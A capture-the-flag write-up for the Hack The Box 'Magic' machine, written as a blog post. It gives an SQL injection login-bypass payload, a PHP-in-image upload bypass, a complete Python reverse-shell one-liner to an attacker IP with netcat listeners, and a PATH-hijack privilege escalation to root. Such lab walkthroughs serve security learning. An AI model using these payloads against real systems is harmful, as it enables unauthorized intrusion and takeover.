---
title: Magic Writeup
author: mooncakeza
date: 2020-04-20 11:30am
categories: [hackthebox]
tags: [hackthebox, writeup]
math: true
image: /assets/img/htb/Magic/magic_infocard.PNG
---

<p>Let's do an NMAP scan</p>

<img src="/assets/img/htb/Magic/01_nmap.png">

<p>
Browsing to http://10.10.10.185 we get a page with images and on the bottom left a login to upload images
</p>

<img src="/assets/img/htb/Magic/02_login_message.png">

<p>
We click login
</p>

<img src="/assets/img/htb/Magic/03_login_blank.png">

<p>
I tried the default username and password combos but nothing.
Since we have no credentials to try, we can try SQL injection

username: ‘or ’1'='1
password: ‘or ’1'='1
</p>

<img src="/assets/img/htb/Magic/03_login_sql.png">

<img src="/assets/img/htb/Magic/05_upload_img.png">

<p>

Seems we can upload images. Let's see what can be uploaded. Let's just click upload.

</p>

<img src="/assets/img/htb/Magic/06_upload_img_error.png">

<p>

Only JPG, JPEG and PNG files are allowed.
Let's go for the bypassing the filter.

Let's upload a file and see where it saves it to.
It uploads it to the front page on the slider and when you right click to view image we can see it saves it under http://10.10.10.185/images/uploads/

Now let's do some magic

Take any JPG,JPEG or PNG inject it with some code and then rename the file.

</p>

<img src="/assets/img/htb/Magic/07_cmd_image_insert.png">

<p>

Upload this file via the upload page

In another terminal run nc -lvnp 9991

The only payload I found to work was the python method

Now point your browser or use curl to the following URL

http://10.10.10.185/images/uploads/lordcommander.php.jpeg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",9991));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

</p>


<img src="/assets/img/htb/Magic/08_img_rev_shell.png">

<p>

We have a shell!

Let's get an interactive shell

<p>

<ol><li>python -c 'import pty; pty.spawn("/bin/bash")'</li><li>ctrl + z (put's the nc into the background)</li><li>echo $TERM (this gets what your term is set as)</li><li>stty -a (this gets your windows size)</li><li>stty raw -echo (NOTE: you will not see any output after this)</li><li>fg (go back to the nc)</li><li>reset (this resets the terminal settings on the remote machine</li><li>In the Terminal type, type in the $TERM output you got, in my case it was xterm-256color. </li></ol>

</p>

<p>

After enumerating a bit we get the following:

</p>

<img src="/assets/img/htb/Magic/09_db_details.png">

<p>

I tried to use the password to login via ssh and su but both failed.
This is not the password.

Let's enumumerate the database. There is no mysql client installed so the only way now is to do a mysqldump.

</p>

<img src="/assets/img/htb/Magic/10_db_dump.png">

<p>

We then find this in the dump: 

</p>

<img src="/assets/img/htb/Magic/11_db_creds.png">

<p>

We have some creds. Password reuse?
let us just su to the user with the password.

</p>


<img src="/assets/img/htb/Magic/12_user_login_png.png">

<p>

user flag achieved!

Now for root.

We first have to upload some enumerating scripts.
I uploaded both LinEnum or LinPEAS and found this pretty interesting:

</p>

<img src="/assets/img/htb/Magic/13_exec_files.png">

<p> 

/bin/sysinfo is executable and the user group has permissions to run it.

There is another tool called pspy64 which monitors linux processes and we can use this to see what it does in the background. So we run /bin/sysinfo and monitor pspy and see the following.

</p>

<img src="/assets/img/htb/Magic/14_fdisk.png">

<p>

sysinfo calls a few files and seems like we can inject our own path to a custom fdisk file to maybe create a reverse shell?

First in another terminal run our nc -lvnp 9994 

Back to the magic terminical and let us add /tmp into the system PATH

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmp

We then create a file in /tmp with the following.

</p>

<img src="/assets/img/htb/Magic/15_python_shell.png">

<p>

Make it executable and then run /bin/sysinfo again and we watch pspy64 again.

</p>

<img src="/assets/img/htb/Magic/16_run_script.png">

<p>

You can see it has now executed our code from the fstab in the /tmp directory instead of the actually operating system's fstab!

Let us pop to the terminal where we can our netcat.

</p>

<img src="/assets/img/htb/Magic/17_shell_pop.png">

<p>

WE HAVE ROOT!

</p>
